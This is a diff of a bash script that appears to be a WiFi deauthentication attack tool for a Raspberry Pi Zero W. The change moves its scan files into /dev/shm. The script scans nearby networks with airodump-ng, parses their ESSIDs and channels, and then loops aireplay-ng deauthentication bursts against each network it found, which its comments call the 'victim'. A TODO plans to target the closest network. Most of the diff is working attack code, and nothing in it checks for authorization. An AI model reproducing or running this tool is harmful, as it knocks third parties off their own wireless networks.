@@ -5,11 +5,15 @@
 
 #TODO: Add a feature to target the closest WiFi in range. We'll play with PWR values in the scan file.
 
+#this defines the attack mode, DO NOT CHANGE, it is changed internally
 flag=""
+#this is your interface and since we use raspi0w, nexmon utilities use the same name for monitor mode
+interface="wlan0"
+#we use RAM to avoid flash memory wear out
+working_folder="/dev/shm"
 
 main()
 {
-  interface="wlan0"
   start_mon
 
   #check if script is setup, otherwise prompt
@@ -26,17 +30,17 @@ main()
 
 clean_up_junk()
 {
-	if [ -d "/var/tmp/perish_dump" ]
+	if [ -d ""$working_folder"/perish_dump" ]
 	then
-		rm -rf /var/tmp/perish_dump
+		rm -rf "$working_folder"/perish_dump
 	fi
 }
 
 create_working_folder()
 {
-	if [ ! -d "/var/tmp/perish_dump" ]
+	if [ ! -d ""$working_folder"/perish_dump" ]
 	then
-		mkdir /var/tmp/perish_dump
+		mkdir "$working_folder"/perish_dump
 	fi
 }
 
@@ -59,13 +63,6 @@ print_menu()
 
 menu()
 {
-	#clear
-
-	#each time menu is called, clean up previous scans
-	clean_up_junk
-
-	#create the working directory, where we save our scan files temporarily
-	create_working_folder
 
 	#print the menu and choose your option afterwards
 	print_menu
@@ -151,7 +148,7 @@ haki()
 	while read essid
 	do
 		#get each corresponding channel for every essid found
-		channel=$(sed -n "${i}{p;q;}" /var/tmp/perish_dump/channels)
+		channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)
 
 		echo "	[+] Synchronising card to channel: $channel"
 		#sync the card to the victim's channel
@@ -162,7 +159,7 @@ haki()
 		aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
 
 		((i++))
-	done < /var/tmp/perish_dump/essids
+	done < "$working_folder"/perish_dump/essids
 
 	#loop when you are done
 	haki
@@ -180,12 +177,21 @@ start_mon()
 
 scan()
 {
-	scan_interval=$1
-	timeout -k $scan_interval airodump-ng $interface --output-format kismet --write "/var/tmp/perish_dump/scan_data" > /dev/null 2>&1 &
+	clear
 
-	awk -F "\"*;\"*" '{print $4}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/bssids
-	awk -F "\"*;\"*" '{print $3}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/essids
-	awk -F "\"*;\"*" '{print $6}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/channels
+	#each time there is a scan, clean up previous ones
+	clean_up_junk
+
+	#create the working directory, where we save our scan files temporarily
+	create_working_folder
+
+	
+	scan_interval=$1
+	timeout -k $scan_interval airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" > /dev/null 2>&1 &
+
+	awk -F "\"*;\"*" '{print $4}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/bssids
+	awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/essids
+	awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/channels
 }
 
 #Here starts the script and passes the flag argument to it
